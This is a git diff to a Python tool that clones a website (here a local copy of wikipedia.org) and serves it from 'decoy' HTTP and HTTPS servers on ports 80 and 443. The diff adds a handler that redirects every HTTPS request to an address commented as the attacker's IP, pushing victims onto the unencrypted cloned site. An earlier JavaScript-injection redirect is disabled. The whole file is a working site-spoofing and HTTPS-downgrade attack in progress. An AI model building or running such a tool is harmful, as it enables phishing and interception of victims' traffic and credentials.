@@ -12,15 +12,10 @@ import signal
 import time
 import threading
 
-# Can also try to use a browser redirect, will test what works best:
-# def do_GET(self):
-#     # Send HTTP Redirect Response (301 or 302)
-#     self.send_response(301)  # Use 302 for temporary redirects
-#     self.send_header("Location", "http://{domain}".format(domain=domain))
-#     self.end_headers()
-
 
 # Define the handler with JavaScript injection
+# In current for this inject doesn't work. Will try another redirect method
+'''
 class InjectRedirectHandler(SimpleHTTPRequestHandler):
   def do_GET(self):
     # Inject JavaScript to redirect from HTTPS to HTTP
@@ -45,12 +40,26 @@ class InjectRedirectHandler(SimpleHTTPRequestHandler):
     self.send_header("Content-type", "text/html")
     self.end_headers()
     self.wfile.write(content.encode("utf-8"))
+'''
 
 ## Define globals to be used
 domain = ''
 directory_name = ''
+## headache lol, in future we should find a more proper way of handling multiple
+## threads and processes
+https_thread = None
+http_thread = None
 https_server = None
 http_server = None
+
+
+class RedirectHTTPSHandler(SimpleHTTPRequestHandler):
+  # Custom handler to redirect to HTTP if no index.html is found.
+  def do_GET(self):
+    # Redirect HTTPS requests to HTTP (port 80)
+    self.send_response(301)
+    self.send_header('Location', '192.168.10.50:80')  # Use attacker IP:port where http server runs
+    self.end_headers()
 
 
 def cert_and_key_file_exist(cert_file="cert.pem", key_file="key.pem"):
@@ -59,6 +68,7 @@ def cert_and_key_file_exist(cert_file="cert.pem", key_file="key.pem"):
 # Function to check robots.txt for scraping permission
 # If I want to honor robots.txt I have to fix so it can be found from mainsite and if not
 # handle that as well. Currently we are running into errors.
+# Uncomment the check in scrape_page function for now
 def can_scrape(in_url):
   robots_url = in_url.rstrip('/') + "/robots.txt"  # Ensure no double slashes
   rp = RobotFileParser()
@@ -109,7 +119,7 @@ def scrape_page(in_url, in_quick_clone="no"):
 def host_local_decoy_https_server(in_cert_file, in_key_file):
   global https_server
   server_address = ('', 443)
-  https_server = http.server.HTTPServer(server_address, InjectRedirectHandler)
+  https_server = http.server.HTTPServer(server_address, RedirectHTTPSHandler)
 
   # Create SSL context
   context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
@@ -118,13 +128,14 @@ def host_local_decoy_https_server(in_cert_file, in_key_file):
   # Wrap server socket with the context
   https_server.socket = context.wrap_socket(https_server.socket, server_side=True)
 
-  print("HTTPS server with JavaScript redirect running on port 443...")
+  print("HTTPS server with redirect running on port 443...")
   https_server.serve_forever()
 
 
 def host_local_decoy_http_server(port=80):
   global http_server
-  dotindex_path = os.path.join(directory_name, f'www.{domain}')
+  #dotindex_path = os.path.join(directory_name, f'{domain}')
+  dotindex_path = "www.wikipedia.orgSite/www.wikipedia.org"
   os.chdir(dotindex_path)  # Change directory to the downloaded site
   http_server = socketserver.TCPServer(("", port), SimpleHTTPRequestHandler)
 
@@ -134,8 +145,9 @@ def host_local_decoy_http_server(port=80):
 
 # Example usage
 def main(in_url, in_port, in_quick_clone):
+  global https_thread, http_thread
   # Oh boy ...
-  scrape_page(in_url, in_quick_clone)
+  #scrape_page(in_url, in_quick_clone)
   signal.signal(signal.SIGINT, signal.SIG_IGN)
   port = in_port
 
@@ -143,7 +155,17 @@ def main(in_url, in_port, in_quick_clone):
   while not cert_and_key_file_exist("cert.pem", "key.pem"):  ## Easy inwait of cert and key generate
     time.sleep(2)
 
-  host_local_decoy_https_server("cert.pem", "key.pem")
+  #host_local_decoy_https_server("cert.pem", "key.pem")
+  ## We will have to silence/pipe the term errors on this one
+  #host_local_decoy_http_server(in_port)
+
+  http_thread = threading.Thread(target=host_local_decoy_http_server, args=(port,), daemon=True)
+  https_thread = threading.Thread(target=host_local_decoy_https_server, args=("cert.pem", "key.pem",), daemon=True)
+
+  http_thread.start()
+  https_thread.start()
+
+  print("Both servers are running as daemon threads...")
 
 
 if __name__ == '__main__':
